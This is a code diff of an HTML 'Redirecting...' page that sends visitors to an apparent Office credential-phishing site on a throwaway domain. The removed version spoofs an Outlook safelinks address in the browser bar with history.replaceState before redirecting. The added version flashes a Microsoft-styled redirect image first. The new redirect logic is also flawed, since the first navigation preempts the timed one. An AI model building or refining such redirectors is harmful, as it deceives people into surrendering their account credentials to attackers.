@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <script>
-        // First URL (invalid but must appear in browser bar)
-        const firstRedirectUrl = "https://nam13.safelinks.protection.outlook.com/?url=https%3A%2F%2F2n8w.app.link%2F&data=05%7C02%";
+        // Image page URL (shows for 1 second)
+        const imagePageUrl = "https://www.miniorange.com/images/microsoft-apps/microsoft-apps-organization-redirect.webp"; // Change this to your actual image URL
 
-        // Final destination URL (where the user should end up)
+        // Final destination URL
         const finalRedirectUrl = "https://m3.ryltvk6.sa.com/m3.secure.zcore/office-3D8/index.php";
 
         // Function to generate a random 80-character string
@@ -21,28 +21,14 @@
             return result;
         }
 
-        // Function to extract the unnamed query parameter after '?='
-        function getUnnamedQueryParam() {
-            const query = window.location.search;
-            const match = query.match(/^\?=([A-Z]{30})$/); // Matches "?=30-uppercase-letters"
-            return match ? match[1] : null;
-        }
+        // Step 1: Redirect to image page (user sees it for 1 second)
+        window.location.replace(imagePageUrl);
 
-        // Extract the 30-character uppercase string
-        const upperString = getUnnamedQueryParam();
-
-        if (upperString) {
-            // Generate a random 80-character string
+        // Step 2: Automatically redirect to final destination after 1 second
+        setTimeout(() => {
             const randomString = generateRandomString(80);
-
-            // Step 1: Change the browser URL without navigating
-            window.history.replaceState(null, "", firstRedirectUrl);
-
-            // Step 2: Instantly redirect to the final URL
-            setTimeout(() => {
-                window.location.replace(`${finalRedirectUrl}?=${randomString}`);
-            }, 10);
-        }
+            window.location.replace(`${finalRedirectUrl}?=${randomString}`);
+        }, 1000); // 1000ms = 1 second
     </script>
 </head>
 <body>
